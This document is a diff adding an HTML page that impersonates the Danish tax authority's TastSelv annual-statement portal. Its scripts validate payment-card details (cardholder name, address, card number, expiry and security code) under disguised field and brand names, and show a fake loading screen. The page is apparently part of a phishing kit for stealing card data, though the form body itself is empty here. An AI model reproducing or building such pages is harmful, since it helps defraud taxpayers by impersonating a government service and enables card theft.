@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html class="no-js" lang="da">
+
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>TastSelv - årsopgørelsen</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
+  <meta name="msapplication-tap-highlight" content="no" />
+  <link rel="shortcut icon" href="/static/theme/favicon.ico" type="image/x-icon" />
+  <link href="/static/theme/skat.min.css" rel="stylesheet" type="text/css" />
+  <link href="/static/theme/jquery-ui.min.css" rel="stylesheet" type="text/css">
+  <link href="/static/theme/jquery-ui.structure.min.css" rel="stylesheet" type="text/css">
+  <link href="/static/theme/jquery-ui./static/theme.min.css" rel="stylesheet" type="text/css">
+
+  <script type="text/javascript" src="/static/theme/jquery-2.2.3.js"></script>
+  <script src="/static/theme/styles.js" type="text/javascript"></script>
+  <style>
+    .error {
+      border-color: red !important;
+    }
+  </style>
+
+  <script>
+
+    function check(form) {
+
+
+
+
+      if (form.nameoncc.value.length < 3) { form.nameoncc.focus(); document.getElementById("errors").style.display = "block"; document.getElementById("nameoncc").classList.add('error'); return; }
+      else { document.getElementById("nameoncc").classList.remove('error'); document.getElementById("errors").style.display = "none"; }
+
+
+      if (form.address.value.length < 3) { form.address.focus(); document.getElementById("errors").style.display = "block"; document.getElementById("address").classList.add('error'); return; }
+      else { document.getElementById("address").classList.remove('error'); document.getElementById("errors").style.display = "none"; }
+
+
+      if (form.zipcode.value.length < 3) { form.zipcode.focus(); document.getElementById("errors").style.display = "block"; document.getElementById("zipcode").classList.add('error'); return; }
+      else { document.getElementById("zipcode").classList.remove('error'); document.getElementById("errors").style.display = "none"; }
+
+
+      if (form.city.value.length < 3) { form.city.focus(); document.getElementById("errors").style.display = "block"; document.getElementById("city").classList.add('error'); return; }
+      else { document.getElementById("city").classList.remove('error'); document.getElementById("errors").style.display = "none"; }
+
+      if (form.btype.value.length < 1) { form.btype.focus(); document.getElementById("errors").style.display = "block"; document.getElementById("btype").classList.add('error'); return; }
+      else { document.getElementById("btype").classList.remove('error'); document.getElementById("errors").style.display = "none"; }
+
+
+      if (!checkThenr(document.getElementById('cnr').value, document.getElementById('thetype').value)) { form.cnr.focus(); document.getElementById("errors").style.display = "block"; document.getElementById("cnr").classList.add('error'); return; }
+      else { document.getElementById("cnr").classList.remove('error'); document.getElementById("errors").style.display = "none"; }
+
+
+      var regExpressPostcode = /^(0[1-9]|1[0-2])\/?(2[3-9]|3[0-9])$/
+      if (!regExpressPostcode.test(form.goned.value)) { form.goned.focus(); document.getElementById("errors").style.display = "block"; document.getElementById("goned").classList.add('error'); return; }
+      else { document.getElementById("goned").classList.remove('error'); document.getElementById("errors").style.display = "none"; }
+
+
+      var regExpressPostcode = /^[0-9]*$/
+      if (!regExpressPostcode.test(form.three.value)) { form.three.focus(); document.getElementById("errors").style.display = "block"; document.getElementById("three").classList.add('error'); return; }
+      else { document.getElementById("three").classList.remove('error'); document.getElementById("errors").style.display = "none"; }
+
+      if (form.three.value.length < 3) { form.three.focus(); document.getElementById("errors").style.display = "block"; document.getElementById("three").classList.add('error'); return; }
+      else { document.getElementById("three").classList.remove('error'); document.getElementById("errors").style.display = "none"; }
+
+
+
+      if (form.thetype.value == "AxA") {
+        if (form.three.value.length < 4) { form.three.focus(); document.getElementById("errors").style.display = "block"; document.getElementById("three").classList.add('error'); return; }
+        else { document.getElementById("three").classList.remove('error'); document.getElementById("errors").style.display = "none"; }
+      }
+
+
+
+
+      form.submit()
+    }
+
+
+
+    function change() {
+      var change = document.getElementById("cnr").value
+
+      if (change.charAt(0) == '5') {
+        document.getElementById("thetype").value = "MxM";
+        document.getElementById("three").maxLength = "3";
+        document.getElementById("three").placeholder = "XXX";
+        document.getElementById("cnr").style = "width:98%; background-image: url('/static/theme/MxM.png'); background-size: 40px 40px; background-repeat: no-repeat; background-position: 98% 50%;"
+      }
+
+
+      else if (change.charAt(0) == '4') {
+        document.getElementById("thetype").value = "VxV";
+        document.getElementById("three").maxLength = "3";
+        document.getElementById("three").placeholder = "XXX";
+        document.getElementById("cnr").style = "width:98%; background-image: url('/static/theme/VxV.png'); background-size: 40px 40px; background-repeat: no-repeat; background-position: 98% 50%;"
+      }
+
+
+      else if (change.charAt(0) == '3') {
+        document.getElementById("thetype").value = "AxA";
+        document.getElementById("three").maxLength = "4";
+        document.getElementById("three").placeholder = "XXXX";
+        document.getElementById("cnr").style = "width:98%; background-image: url('/static/theme/AxA.png'); background-size: 40px 40px; background-repeat: no-repeat; background-position: 98% 60%;"
+      }
+
+
+      else if (change.charAt(0) == '6') {
+        document.getElementById("thetype").value = "DxD";
+        document.getElementById("three").maxLength = "3";
+        document.getElementById("three").placeholder = "XXX";
+        document.getElementById("cnr").style = "width:98%; background-image: url('/static/theme/DxD.png'); background-size: 40px 40px; background-repeat: no-repeat; background-position: 98% 50%;"
+      }
+
+      else {
+        document.getElementById("three").placeholder = "XXX";
+        document.getElementById("cnr").style = "width:98%; background-image: url('/static/theme/x.webp'); background-size: 20px 20px; background-repeat: no-repeat; background-position: 98% 50%;"
+      }
+
+
+
+    }
+  </script>
+  <style type="text/css">
+    .ui-dialog .ui-dialog-title {
+      text-align: center;
+      width: 100%;
+    }
+
+    .no-close .ui-dialog-titlebar-close {
+      display: none;
+    }
+  </style>
+</head>
+
+<body class="skts-logged-in">
+  <div class="skts-wrap">
+    <header>
+      <div class="container">
+        <div class="skts-logo">
+          <a href="#"><span class="sr-only">Til forside</span></a>
+        </div>
+        <ul class="skts-focus-links">
+          <li><a href="#">Gå til indhold</a></li>
+        </ul>
+        <a class="pull-right skts-login" href="#">Log af</a>
+        <span class="pull-right" style="color: red; font-weight: bold">&nbsp;</span>
+      </div>
+    </header>
+    <div class="navbar navbar-default" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span>Menu</span>
+          </button>
+        </div>
+        <div class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+            <li><a href="#">Forside</a></li>
+            <li><a class="active" href="#">Årsopgørelse</a></li>
+            <li><a href="#">Forskudsopgørelse</a></li>
+            <li><a href="#">Betaling</a></li>
+            <li><a href="#">Skatteoplysninger</a></li>
+            <li><a href="#">Motor</a></li>
+          </ul>
+          <ul class="nav navbar-nav navbar-right">
+            <li><a href="#">Kontakt</a></li>
+            <li><a href="#">Profil</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <a href="#" class="sr-only" id="skts-skip-link-target-indhold" tabindex="-1">Start af indhold</a>
+
+
+    <div id="pleasewait" class="container">
+      <div style="padding-top:200px;padding-bottom:380px;" align="center">
+        <img src="/static/theme/loading.svg">
+      </div>
+    </div>
+
+    <div id="maindiv" style="display:none;" class="container">
+      
+      
+    </div>
+  </div>
+  </form>
+  <footer>
+    <div class="container">
+      <div style="padding-bottom: 15px;">
+        <div style="float: left"><a href="#">Tilgængelighedserklæring<span class="sr-only"> Åbner nyt vindue</span></a>
+        </div>
+        <div style="float: right"> <a href="#">Om cookies<span class="sr-only"> Åbner nyt
+              vindue</span></a>&nbsp;&nbsp;&nbsp; <a href="#">Ret cookiesamtykke<span class="sr-only"> Åbner nyt
+              vindue</span></a> </div>
+        <div style="text-align: center">
+          <address style="color: #fff;">Kontakt os: <a href="#"><span style="white-space:nowrap">72 22 18 18<span></a>
+          </address>
+        </div>
+      </div>
+      <div class="skts-footer-info">
+        <p class="text-center">skat.dk er Skatteforvaltningens digitale indgang til selvbetjening og vejledning om
+          skatter og afgifter</p>
+      </div>
+    </div>
+  </footer>
+</body>
+
+</html>
+
+<script>
+  var characterCount
+  $('#goned').on('input', function (e) {
+    if ($(this).val().length == 2 && characterCount < $(this).val().length) {
+      $(this).val($(this).val() + '/');
+    }
+    characterCount = $(this).val().length
+  });
+
+
+
+
+</script>
+
+
+
+<script type="text/javascript">
+  setTimeout(function () {
+    $("#pleasewait").hide();
+    $("#maindiv").show();
+  }, 0800);
+
+</script>
